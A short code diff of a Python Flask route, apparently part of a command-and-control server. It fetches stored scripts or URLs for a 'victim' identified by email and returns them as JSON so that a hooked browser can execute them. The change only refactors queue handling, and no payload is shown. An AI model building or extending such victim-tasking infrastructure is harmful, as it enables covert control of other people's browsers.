@@ -193,19 +193,19 @@ def execute_script(email):
         # oldList = executeQueue.get(str(email), [])
         # oldList.append(str(script))
         # executeQueue[str(email)] = oldList
-        victim_urls = victim.getFromVictim(email)
-        print list(victim_urls)
+        victim_urls = list(victim.getFromVictim(email))
         return redirect(url_for('view_user', email=email))
+        # return jsonify(url=victim_urls)
     elif request.method == 'GET':
         #print "EMAIL:", str(email)
         #print "EXECUTE:", executeQueue
-        script = executeQueue.get(str(email), [])
         #print "SCRIPTS:", script
+        victim_urls = list(victim.getFromVictim(email))
+        script = victim_urls
         if script:
             #print "IN SCRIPT"
-            executeQueue[str(email)] = []
+            #executeQueue[str(email)] = []
             #print executeQueue
-            #print script
             return jsonify(js=script)
         else:
             #print "NOT IN SCRIPT"
